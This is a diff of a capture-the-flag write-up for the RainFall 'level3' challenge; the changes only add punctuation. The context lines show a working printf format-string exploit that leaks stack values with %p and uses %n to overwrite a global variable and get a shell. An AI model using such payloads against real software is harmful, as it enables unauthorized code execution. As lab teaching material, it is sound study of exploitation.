@@ -23,7 +23,7 @@ level3@RainFall:~$ python -c 'print "0000" + "%p "*10' | ./level3
 ```
 We can see that the 4th pointer gets modified by our printf format string as it's made of four zeroes (0x30303030), nice!
 
-Let's simplify our string a bit now that we know which argument we can act on
+Let's simplify our string a bit now that we know which argument we can act on.
 
 ```shell
 level3@RainFall:~$ python -c 'print "0000%4$p"' | ./level3
@@ -62,7 +62,7 @@ This is why we write `0x804988c` in little-endian manually.
 Now that we have access to the address of `m`, we can use `%n` to write a number to it as the BUG section of `printf` man tells us. 
 The flag `%n` writes the number of character written so far to the pointer passed as argument, perfect to modify the value of `m`!
 
-Since our format string is 4 bytes long, we need to add 60 more bytes
+Since our format string is 4 bytes long, we need to add 60 more bytes.
 
 ```shell
 level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' | ./level3
@@ -74,7 +74,7 @@ We won! we just need to find a way to keep the shell open now.
 
 ## Putting it together
 
-Let's send `cat` on stdin after our format string to keep the shell open
+Let's send `cat` on stdin after our format string to keep the shell open.
 ```shell
 level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "a"*60 + "%4$n"' ; cat -) | ./level3
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
